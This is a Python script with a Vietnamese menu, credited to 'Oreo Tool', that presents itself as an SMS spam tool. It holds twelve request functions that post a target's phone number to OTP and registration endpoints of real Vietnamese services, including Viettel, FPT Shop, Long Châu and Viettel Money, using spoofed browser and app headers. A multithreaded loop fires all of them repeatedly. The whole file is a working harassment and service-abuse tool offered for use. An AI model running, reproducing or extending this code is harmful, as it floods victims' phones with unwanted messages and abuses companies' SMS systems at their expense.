import requests
import threading
import time
import sys
import re
import os
from concurrent.futures import ThreadPoolExecutor

try:
    import keyboard
except ImportError:
    print("Vui lòng cài đặt thư viện: pip install keyboard requests")
    sys.exit(1)

# Biến toàn cục để điều khiển dừng
STOP_FLAG = False

# =====================================================================
# THÔNG TIN TÁC GIẢ
# =====================================================================
AUTHOR_NAME = "Oreo Tool"
AUTHOR_TG = "@miralji"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    print("==================================================")
    print("  ██████╗ ██████╗ ███████╗ ██████╗ ")
    print(" ██╔═══██╗██╔══██╗██╔════╝██╔═══██╗")
    print(" ██║   ██║██████╔╝█████╗  ██║   ██║")
    print(" ██║   ██║██╔══██╗██╔══╝  ██║   ██║")
    print(" ╚██████╔╝██║  ██║███████╗╚██████╔╝")
    print("  ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝ ")
    print("==================================================")
    print(f" Tác giả : {AUTHOR_NAME}")
    print(f" Telegram: {AUTHOR_TG}")
    print("==================================================\n")

# =====================================================================
# CẤU HÌNH PROVIDER (Giữ nguyên các API)
# =====================================================================
HEADERS_JSON = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Content-Type": "application/json"
}

def send_sapo(phone):
    url = "https://www.sapo.vn/fnb/sendotp"
    headers = {"User-Agent": HEADERS_JSON["User-Agent"], "Content-Type": "application/x-www-form-urlencoded"}
    data = {"phonenumber": phone}
    return requests.post(url, headers=headers, data=data, timeout=10).status_code

def send_viettel(phone):
    url = "https://viettel.vn/api/get-otp"
    headers = {**HEADERS_JSON, "Origin": "https://viettel.vn", "Referer": "https://viettel.vn/dang-ky"}
    data = {"msisdn": phone}
    return requests.post(url, headers=headers, json=data, timeout=10).status_code

def send_medicare(phone):
    url = "https://medicare.vn/api/otp"
    headers = {**HEADERS_JSON, "Origin": "https://medicare.vn", "Referer": "https://medicare.vn/login"}
    data = {"mobile": phone, "mobile_country_prefix": "84"}
    return requests.post(url, headers=headers, json=data, timeout=10).status_code

def send_tv360(phone):
    url = "https://tv360.vn/public/v1/auth/get-otp-login"
    headers = {**HEADERS_JSON, "Origin": "https://tv360.vn", "Referer": "https://tv360.vn/login"}
    data = {"msisdn": phone}
    return requests.post(url, headers=headers, json=data, timeout=10).status_code

def send_ghn(phone):
    url = "https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp"
    headers = {**HEADERS_JSON, "Origin": "https://sso.ghn.vn", "Referer": "https://sso.ghn.vn/"}
    data = {"phone": phone, "type": "register"}
    return requests.post(url, headers=headers, json=data, timeout=10).status_code

def send_fptshop(phone):
    url = "https://papi.fptshop.com.vn/gw/is/user/new-send-verification"
    headers = {
        **HEADERS_JSON, "apptenantid": "E6770008-4AEA-4EE6-AEDE-691FD22F5C14", 
        "order-channel": "1", "Origin": "https://fptshop.com.vn", "Referer": "https://fptshop.com.vn/"
    }
    data = {"fromSys": "WEBKHICT", "otpType": "0", "phoneNumber": phone}
    return requests.post(url, headers=headers, json=data, timeout=10).status_code

def send_winmart(phone):
    url = "https://api-crownx.winmart.vn/iam/api/v1/user/register"
    headers = {
        **HEADERS_JSON, "Authorization": "Bearer undefined", "x-api-merchant": "WCM",
        "Origin": "https://winmart.vn", "Referer": "https://winmart.vn/"
    }
    data = {"firstName": "Nguyen Van A", "phoneNumber": phone, "masanReferralCode": "", "dobDate": "2000-01-01", "gender": "Male"}
    return requests.post(url, headers=headers, json=data, timeout=10).status_code

def send_longchau(phone):
    url = "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification"
    headers = {
        **HEADERS_JSON, "order-channel": "1", "x-channel": "EStore",
        "Origin": "https://nhathuoclongchau.com.vn", "Referer": "https://nhathuoclongchau.com.vn/"
    }
    data = {"phoneNumber": phone, "otpType": 0, "fromSys": "WEBKHLC"}
    return requests.post(url, headers=headers, json=data, timeout=10).status_code

def send_ahamove(phone):
    url = "https://api.ahamove.com/api/v3/public/user/login"
    headers = {**HEADERS_JSON, "Origin": "https://app.ahamove.com", "Referer": "https://app.ahamove.com/"}
    data = {"mobile": phone, "country_code": "VN", "firebase_sms_auth": True}
    return requests.post(url, headers=headers, json=data, timeout=10).status_code

def send_fahasa(phone):
    url = "https://www.fahasa.com/ajaxlogin/ajax/checkPhone"
    headers = {
        "User-Agent": HEADERS_JSON["User-Agent"], "Content-Type": "application/x-www-form-urlencoded",
        "x-requested-with": "XMLHttpRequest", "Origin": "https://www.fahasa.com", "Referer": "https://www.fahasa.com/customer/account/login"
    }
    data = {"phone": phone}
    return requests.post(url, headers=headers, data=data, timeout=10).status_code

def send_vinamilk(phone):
    url = "https://new.vinamilk.com.vn/api/account/getotp"
    headers = {**HEADERS_JSON, "Authorization": "Bearer null", "Origin": "https://new.vinamilk.com.vn", "Referer": "https://new.vinamilk.com.vn/account/register"}
    data = f'{{"type":"register","phone":"{phone}"}}'
    return requests.post(url, headers=headers, data=data, timeout=10).status_code

def send_viettel_money(phone):
    url = "https://api8.viettelpay.vn/customer/v2/accounts/register"
    headers = {
        **HEADERS_JSON, 
        "User-Agent": "Viettel Money/8.8.8 (com.viettel.viettelpay; build:3; iOS 17.0.2) Alamofire/4.9.1",
        "app-version": "8.8.8", "product": "VIETTELPAY", "type-os": "ios", "accept-language": "vi", "authority-party": "APP"
    }
    data = {"identityType": "msisdn", "identityValue": phone, "type": "REGISTER"}
    return requests.post(url, headers=headers, json=data, timeout=10).status_code

PROVIDERS = [
    ("Sapo", send_sapo), ("Viettel", send_viettel), ("Medicare", send_medicare),
    ("TV360", send_tv360), ("GHN", send_ghn), ("FPT Shop", send_fptshop),
    ("WinMart", send_winmart), ("Long Châu", send_longchau), ("Ahamove", send_ahamove),
    ("Fahasa", send_fahasa), ("Vinamilk", send_vinamilk), ("Viettel Money", send_viettel_money)
]

# =====================================================================
# HÀM XỬ LÝ BẮN
# =====================================================================
def fire(provider, phone):
    global STOP_FLAG
    if STOP_FLAG: return
    
    name, func = provider
    try:
        status = func(phone)
        if status < 400:
            print(f"[+] {name:15} OK (HTTP {status})")
        else:
            print(f"[-] {name:15} Lỗi (HTTP {status})")
    except Exception as e:
        print(f"[!] {name:15} Lỗi: {type(e).__name__}")

def listen_for_stop():
    """Lắng nghe phím bất kỳ để dừng tool"""
    global STOP_FLAG
    keyboard.read_key()  # Đợi bấm 1 phím
    STOP_FLAG = True
    print("\n\n[!] ĐÃ NHẬN LỆNH DỪNG KHẨN CẤP. Đang thoát...")

def run_spam(phone, rounds, threads):
    global STOP_FLAG
    STOP_FLAG = False
    
    print(f"\n=== BẮT ĐẦU: {phone} | {rounds} vòng | {threads} luồng ===")
    print(">>> BẤM BẤT KỲ PHÍM NÀO ĐỂ DỪNG KHẨN CẤP <<<\n")
    
    # Chạy luồng lắng nghe phím tắt
    stop_thread = threading.Thread(target=listen_for_stop, daemon=True)
    stop_thread.start()

    for i in range(1, rounds + 1):
        if STOP_FLAG:
            break
            
        print(f"--- Vòng {i}/{rounds} ---")
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(fire, p, phone) for p in PROVIDERS]
            for f in futures:
                f.result()
        
        if i < rounds and not STOP_FLAG:
            # Đếm ngược nghỉ
            for _ in range(2):
                if STOP_FLAG: break
                time.sleep(1)

    if STOP_FLAG:
        print("\n[!] TIẾN TRÌNH ĐÃ DỪNG THEO YÊU CẦU.")
    else:
        print("\n[+] HOÀN THÀNH TẤT CẢ CÁC VÒNG.")

# =====================================================================
# MENU CHÍNH
# =====================================================================
def main():
    while True:
        print_banner()
        print(" [1] Bắt đầu Spam")
        print(" [2] Thông tin Tool")
        print(" [0] Thoát")
        print("==================================================")
        
        choice = input("Chọn chức năng: ").strip()
        
        if choice == "1":
            print("\n--- CẤU HÌNH SPAM ---")
            phone = input("Nhập số điện thoại (VD: 0987654321): ").strip()
            if not phone:
                print("Chưa nhập số!")
                time.sleep(2)
                continue
                
            try:
                rounds = int(input("Nhập số vòng (VD: 5): ").strip())
                threads = int(input("Nhập số luồng (VD: 5): ").strip())
            except ValueError:
                print("Lỗi: Vui lòng nhập số nguyên!")
                time.sleep(2)
                continue

            run_spam(phone, rounds, threads)
            input("\nBấm Enter để quay lại menu...")
            
        elif choice == "2":
            print("\n--------------------------------------------------")
            print(f" Tool    : Spam SMS Multi-API")
            print(f" Tác giả : {AUTHOR_NAME}")
            print(f" Telegram: {AUTHOR_TG}")
            print("--------------------------------------------------")
            input("Bấm Enter để quay lại...")
            
        elif choice == "0":
            print("\nTạm biệt!")
            sys.exit(0)
        else:
            print("Lựa chọn không hợp lệ!")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nĐã thoát chương trình.")
        sys.exit(0)
